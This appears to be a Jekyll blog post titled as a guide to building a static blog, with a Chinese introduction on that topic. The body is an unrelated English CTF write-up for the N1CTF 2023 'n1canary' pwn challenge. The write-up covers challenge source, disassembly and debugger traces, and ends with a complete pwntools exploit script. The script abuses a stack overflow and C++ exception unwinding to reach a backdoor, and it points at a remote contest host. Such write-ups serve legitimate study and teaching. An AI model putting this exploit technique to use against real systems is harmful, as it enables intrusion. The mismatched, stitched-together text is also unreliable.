---
layout: post
title:  "Jekyll 搭建静态博客"
date:   2015-02-15 22:14:54
categories: jekyll
tags: jekyll RubyGems
---

* content
{:toc}

一直以来都想搭建一个自己的博客，但是近半年做项目太忙，再加上教研室的网络很坑爹，所以也一直没顾得上。之前用过 WordPress 托管在免费的京东云擎上，但是速度太慢。在知乎上看到一些相关的内容，于是选择了在github上用jekyll搭建博客。



## N1CTF 2023 : n1canary
Rating weight: 97,33 
During the 2 weekends, I played the N1CTF contest with my teammate `cauca`, we landed in the top 45 and I managed to solve 1/4 problem in PWN category :()
![image](https://hackmd.io/_uploads/Byh_XerIT.png)

### Overview

After this contest, i asked author for the source of this challenge to make it easy to debug.

`main.cpp`
```cpp
#include "sys/random.h"
#include "utils.h"
#include <cstdio>
#include <cstring>
#include <memory>
constexpr size_t CANARY_RANDBITS = 3;
constexpr size_t CANARY_SHIFTBITS = 4;
constexpr size_t CANARY_POOL_SIZE = 1 << CANARY_RANDBITS;
u64 user_canary[CANARY_POOL_SIZE];
u64 sys_canary[CANARY_POOL_SIZE];
template <size_t SIZE> struct ProtectedBuffer {
  char buf[SIZE];
  char padding = 0;
  u64 canary;
  ProtectedBuffer() {
    bzero(buf, sizeof(buf));
    canary = getCanary();
  }
  u64 getCanary() {
    u64 addr = (u64)this;
    u64 canary_idx = (addr >> CANARY_SHIFTBITS) & (CANARY_POOL_SIZE - 1);
    u64 raw_canary = user_canary[canary_idx] ^ sys_canary[canary_idx];
    return raw_canary;
  }
  void check() {
    if (canary != getCanary()) {
      raise("*** stack smash detected ***");
    }
  }
  template <typename Fn> void mut(Fn const &fn) {
    fn(buf);
    check();
  }
};

static void init_canary() {
  if (sizeof(sys_canary) != getrandom(sys_canary, sizeof(sys_canary), 0)) {
    raise("canary init error");
  }
  puts("To increase entropy, give me your canary");
  readall(user_canary);
}

struct UnsafeApp {
  UnsafeApp() { puts("creating dangerous app..."); }
  virtual ~UnsafeApp() {}
  virtual void launch() = 0;
};

struct BOFApp : UnsafeApp {
  void launch() override {
    ProtectedBuffer<64> buf;
    puts("input something to pwn :)");
    buf.mut([](char *p) { scanf("%[^\n]", p); });
    puts(buf.buf);
  }
};

static void backdoor() { system("/readflag"); }

int main() {
  setbuf(stdin, nullptr);
  setbuf(stdout, nullptr);
  init_canary();
  try {
    auto app = std::make_unique<BOFApp>();
    app->launch();
  } catch (...) {
    puts("error!!!");
    exit(1);
  }
}
```
`utils.h`
```cpp
#pragma once
#include <cstdlib>
#include <stdexcept>
#include <unistd.h>
using u64 = unsigned long long;
static inline void raise(const char *msg) {
  puts(msg);
  throw std::runtime_error(msg);
}
static inline void readall(void *ptr, size_t size) {
  char *p = (char *)ptr;
  size_t tot = 0;
  while (tot < size) {
    auto res = read(STDIN_FILENO, p + tot, size - tot);
    if (res <= 0)
      raise("IO error");
    tot += res;
  }
}
template <typename T> static inline void readall(T &dest) {
  readall(&dest, sizeof(dest));
}
```
As the title describes, the questioner implemented a canary by himself.

```cpp
static void init_canary() {
  if (sizeof(sys_canary) != getrandom(sys_canary, sizeof(sys_canary), 0)) {
    raise("canary init error");
  }
  puts("To increase entropy, give me your canary");
  readall(user_canary);
}
```

In main function, an object <BOF> was actually instantiated and then lauch and other subsequent functions were called.
    

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  char v5[8]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  init_canary();
  std::make_unique<BOFApp>(v5);
  v3 = std::unique_ptr<BOFApp>::operator->(v5);
  (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);
  std::unique_ptr<BOFApp>::~unique_ptr(v5);
  return 0;
}
```

The destructor of that object i was found, the function pointer is call, so it's seem to be value to exploit.
    
```cpp
__int64 __fastcall std::default_delete<BOFApp>::operator()(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = a2;
  if ( a2 )
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 8LL))(a2);
  return result;
}
```
    
This main call to BOFApp::launch 
```cpp
unsigned __int64 __fastcall BOFApp::launch(BOFApp *this)
{
  char v2; // [rsp+1Fh] [rbp-61h] BYREF
  char s[88]; // [rsp+20h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  ProtectedBuffer<64ul>::ProtectedBuffer(s);
  puts("input something to pwn :)");
  ProtectedBuffer<64ul>::mut<BOFApp::launch(void)::{lambda(char *)#1}>(s, &v2);
  puts(s);
  return v4 - __readfsqword(0x28u);
```
Seem safe, wecontinue in mut method, it take the function as a argument 
    
```cpp
_int64 __fastcall ProtectedBuffer<64ul>::mut<BOFApp::launch(void)::{lambda(char *)#1}>(__int64 a1, __int64 a2)
{
  BOFApp::launch(void)::{lambda(char *)#1}::operator()(a2, a1);
  return ProtectedBuffer<64ul>::check(a1);
}    
```

Through debugging, we can see that there is a stack overflow vulnerability in here because it call to `scanf("%[^\n]", p)` and don't check boundary
    
    
But the problem come here, it call the function  `ProtectedBuffer<64ul>::check(a1)` 
```cpp
bool __fastcall ProtectedBuffer<64ul>::check(__int64 a1)
{
  __int64 v1; // rbx
  bool result; // al

  v1 = *(_QWORD *)(a1 + 72);
  result = v1 != ProtectedBuffer<64ul>::getCanary(a1);
  if ( result )
    raise("*** stack smash detected ***");
  return result;
}
```    
    
If we cannot bypass this, it will `raise("*** stack smash detected ***")`, we will look that after.
    
```cpp
int backdoor(void)
{
  return system("/readflag");
}
```

I see a backdoor function, but somehow we manage to call it when we don't bypass the canary ?

```cpp
try {
auto app = std::make_unique<BOFApp>();
app->launch();
} catch (...) {
puts("error!!!");
exit(1);
}
```

```cpp
──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────
   0x4018f2 <ProtectedBuffer<64ul>::check()+40>    setne  al
   0x4018f5 <ProtectedBuffer<64ul>::check()+43>    test   al, al
   0x4018f7 <ProtectedBuffer<64ul>::check()+45>    je     ProtectedBuffer<64ul>::check()+62                      <ProtectedBuffer<64ul>::check()+62>
 
   0x4018f9 <ProtectedBuffer<64ul>::check()+47>    lea    rax, [rip + 0x7be]
   0x401900 <ProtectedBuffer<64ul>::check()+54>    mov    rdi, rax
 ► 0x401903 <ProtectedBuffer<64ul>::check()+57>    call   raise(char const*)                      <raise(char const*)>
        rdi: 0x4020be ◂— '*** stack smash detected ***'
        rsi: 0xa
        rdx: 0x0
        rcx: 0x20
 
   0x401908 <ProtectedBuffer<64ul>::check()+62>    nop    
   0x401909 <ProtectedBuffer<64ul>::check()+63>    mov    rbx, qword ptr [rbp - 8]
   0x40190d <ProtectedBuffer<64ul>::check()+67>    leave  
   0x40190e <ProtectedBuffer<64ul>::check()+68>    ret    
 
   0x40190f                                        nop    
────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffdf367cad0 ◂— 9 /* '\t' */
01:0008│     0x7ffdf367cad8 —▸ 0x7ffdf367cb40 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
02:0010│     0x7ffdf367cae0 —▸ 0x7ffdf367cb40 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
03:0018│     0x7ffdf367cae8 —▸ 0x7ffdf367cce8 —▸ 0x7ffdf367e21e ◂— 0x74756f2e612f2e /* './a.out' */
04:0020│ rbp 0x7ffdf367caf0 —▸ 0x7ffdf367cb10 —▸ 0x7ffdf367cba0 ◂— 0x0
05:0028│     0x7ffdf367caf8 —▸ 0x401739 (void ProtectedBuffer<64ul>::mut<BOFApp::launch()::{lambda(char*)#1}>(BOFApp::launch()::{lambda(char*)#1} const&)+51) ◂— nop 
06:0030│     0x7ffdf367cb00 —▸ 0x7ffdf367cb3f ◂— 0x4141414141414100
07:0038│     0x7ffdf367cb08 —▸ 0x7ffdf367cb40 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401903 ProtectedBuffer<64ul>::check()+57
   1         0x401739 void ProtectedBuffer<64ul>::mut<BOFApp::launch()::{lambda(char*)#1}>(BOFApp::launch()::{lambda(char*)#1} const&)+51
   2         0x40169d BOFApp::launch()+77
   3         0x403407
   4         0x4f4ab0
   5         0x4f4ab0
   6          0x12000
   7   0x7ffdf367cce8
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>   
```
When the check fault, it will use function `raise()` to print `*** stack smash detected ***` and when an exception is thrown, it will look for catch. If it is not found in this function, it will be searched up along the function call chain, and there will be two results:
* Find the catch, record the catch location, clean the stack starting from the function that throws the exception, until you reach the function where the catch is located, and enter the catch code for processing
* If the corresponding catch is not found after walking through the call chain, then call std::terminate()this function to abort the program by default.

If you curious about that, feel free to read the [article](https://baiy.cn/doc/cpp/inside_exception.htm).

Next in the chain it will call : 
`raise->__cxa_throw->_Unwind_RaiseException`

```
 ► 0x404056 <__cxa_throw+54>    call   _Unwind_RaiseException                      <_Unwind_RaiseException>
        rdi: 0x12c13b0 ◂— 0x474e5543432b2b00
        rsi: 0x4e76f0 (typeinfo for std::runtime_error) —▸ 0x4e75e0 (vtable for __cxxabiv1::__si_class_type_info+16) —▸ 0x404120 (__cxxabiv1::__si_class_type_info::~__si_class_type_info()) ◂— endbr64 
        rdx: 0x404740 (std::runtime_error::~runtime_error()) ◂— endbr64 
        rcx: 0x12c1408 ◂— '*** stack smash detected ***'
```
The `_Unwind_RaiseException()` function take each address of the frame below to find out where the catch is, if it's dont find, it will call to ` std::terminate() ` to end the program.
    
```cpp
──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x404056 __cxa_throw+54
   1         0x402178 raise(char const*)+83
   2         0x4026b2 ProtectedBuffer<64ul>::check()+62
   3         0x4024e3 void ProtectedBuffer<64ul>::mut<BOFApp::launch()::{lambda(char*)#1}>(BOFApp::launch()::{lambda(char*)#1} const&)+51
   4         0x40245a BOFApp::launch()+62
   5       0xdeadbeef
   6       0xdeadbeef
   7       0xdeadbeef
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
So, if we want to continue the flow execution in main, we much provide exactly where the address of the catch block is, so we can continue to exploit it that don't terminate program.
    
I have found out the address `0x4022de` that make program continue execution because it is where the catch block lie. 
    
```cpp
  0x41acdd <_Unwind_RaiseException+909>    mov    r14, qword ptr [rbp - 0x10]
   0x41ace1 <_Unwind_RaiseException+913>    mov    r15, qword ptr [rbp - 8]
   0x41ace5 <_Unwind_RaiseException+917>    mov    rbp, qword ptr [rbp]
   0x41ace9 <_Unwind_RaiseException+921>    mov    rsp, rcx
   0x41acec <_Unwind_RaiseException+924>    pop    rcx
 ► 0x41aced <_Unwind_RaiseException+925>    jmp    rcx                           <main+116>
    ↓
   0x4022f1 <main+116>                      endbr64 
   0x4022f5 <main+120>                      mov    rbx, rax
   0x4022f8 <main+123>                      lea    rax, [rbp - 0x18]
   0x4022fc <main+127>                      mov    rdi, rax
   0x4022ff <main+130>                      call   std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()                      <std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()>
``` 
We sucessfully change it flow!
But, how can we execute the `backdoor()` function, because it will call to `exit()` to terminate the program with out return.
 
Next, it will call to the destructor of this object, let's go deeper:
```cpp
0x4022f1 <main+116>                      endbr64 
   0x4022f5 <main+120>                      mov    rbx, rax
   0x4022f8 <main+123>                      lea    rax, [rbp - 0x18]
   0x4022fc <main+127>                      mov    rdi, rax
 ► 0x4022ff <main+130>                      call   std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()                      <std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()>
        rdi: 0x7ffe1006ece8 —▸ 0x7ffe1006ed40 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
        rsi: 0x4022f1 (main+116) ◂— endbr64 
        rdx: 0x1
        rcx: 0x4022f1 (main+116) ◂— endbr64     
```

We go through and see this will cause SIGSEV when `rdx` doesn't point to a valid address, 
```cpp
   0x4027d7 <std::default_delete<BOFApp>::operator()(BOFApp*) const+29>    mov    rdx, qword ptr [rax]
   0x4027da <std::default_delete<BOFApp>::operator()(BOFApp*) const+32>    add    rdx, 8
 ► 0x4027de <std::default_delete<BOFApp>::operator()(BOFApp*) const+36>    mov    rdx, qword ptr [rdx]
   0x4027e1 <std::default_delete<BOFApp>::operator()(BOFApp*) const+39>    mov    rdi, rax
   0x4027e4 <std::default_delete<BOFApp>::operator()(BOFApp*) const+42>    call   rdx
```
As long as you control rax, you can control rdx, which results in arabitrary execution.

This function actually takes out the data from the stack (the original data is not user_canary, it is overwritten by overflow. The original data on the stack is a heap address) combined with the stack overflow above we can control rax .
```cpp
 0x4025c9 <std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()+57>    mov    rbx, rax
   0x4025cc <std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()+60>    mov    rax, qword ptr [rbp - 0x18]
   0x4025d0 <std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()+64>    mov    rdi, rax
 ► 0x4025d3 <std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::~unique_ptr()+67>    call   std::remove_reference<BOFApp*&>::type&& std::move<BOFApp*&>(BOFApp*&)                      <std::remove_reference<BOFApp*&>::type&& std::move<BOFApp*&>(BOFApp*&)>
        rdi: 0x4022c6 (main+73) ◂— call 0xffffffffe907ac13
        rsi: 0x4022f1 (main+116) ◂— endbr64 
        rdx: 0x1
        rcx: 0x4022f1 (main+116) ◂— endbr64
```
    
Finally, we manage to control rdx to point to `backdoor()` function.
```
 0x4027d5 <std::default_delete<BOFApp>::operator()(BOFApp*) const+27>             je     std::default_delete<BOFApp>::operator()(BOFApp*) const+44                      <std::default_delete<BOFApp>::operator()(BOFApp*) const+44>
 
   0x4027d7 <std::default_delete<BOFApp>::operator()(BOFApp*) const+29>             mov    rdx, qword ptr [rax]
   0x4027da <std::default_delete<BOFApp>::operator()(BOFApp*) const+32>             add    rdx, 8
   0x4027de <std::default_delete<BOFApp>::operator()(BOFApp*) const+36>             mov    rdx, qword ptr [rdx]
   0x4027e1 <std::default_delete<BOFApp>::operator()(BOFApp*) const+39>             mov    rdi, rax
 ► 0x4027e4 <std::default_delete<BOFApp>::operator()(BOFApp*) const+42>             call   rdx                           <backdoor()>
        rdi: 0x4eb0c0 (user_canary) ◂— 0x4eb0c0
        rsi: 0x4eb0c0 (user_canary) ◂— 0x4eb0c0
        rdx: 0x402263 (backdoor()) ◂— endbr64 
        rcx: 0x4022f1 (main+116) ◂— endbr64 
 
   0x4027e6 <std::default_delete<BOFApp>::operator()(BOFApp*) const+44>             nop    
   0x4027e7 <std::default_delete<BOFApp>::operator()(BOFApp*) const+45>             leave  
   0x4027e8 <std::default_delete<BOFApp>::operator()(BOFApp*) const+46>             ret    
 
   0x4027e9                                                                         nop    
   0x4027ea <std::unique_ptr<BOFApp, std::default_delete<BOFApp> >::get() const>    endbr64 
```  
Get a shell! 
```c
[DEBUG] Received 0x1c bytes:
    b'sh: 1: /readflag: not found\n'
sh: 1: /readflag: not found
```
Final script:
```python
from pwn import *
import time

if args.LOCAL:
    io=process('./a.out')
    if args.GDB:
        cmd="""
        b* 0x420978 
        b* 0x4038fc
        c
        """
        gdb.attach(io, gdbscript=cmd)
else:
    io=remote('43.132.193.22', 9999)

elf=context.binary=ELF('./a.out')
context.log_level='debug'
system=0x000000000042dc10
pop_rdi=0x0000000000403090
bin_sh=0x4bdd62
backdoor=0x000000000403387
user_canary=0x4f4aa0

pl=p64(backdoor)*2+p64(0x4f4aa0) # fake obj
pause()
io.send(pl+(64-len(pl))*b'\0')
sleep(1)

pl=b'A'*96+p64(0)+p64(0x0000000000403407)+p64(0x4f4aa0+8*2)*2
pause()

sleep(1)
io.sendline(pl)
sleep(1)
io.interactive()
```
### Reference
https://maskray.me/blog/2020-11-08-stack-unwinding
https://github.com/chop-project/
https://www.cnblogs.com/catch/p/3604516.html
https://baiy.cn/doc/cpp/inside_exception.htm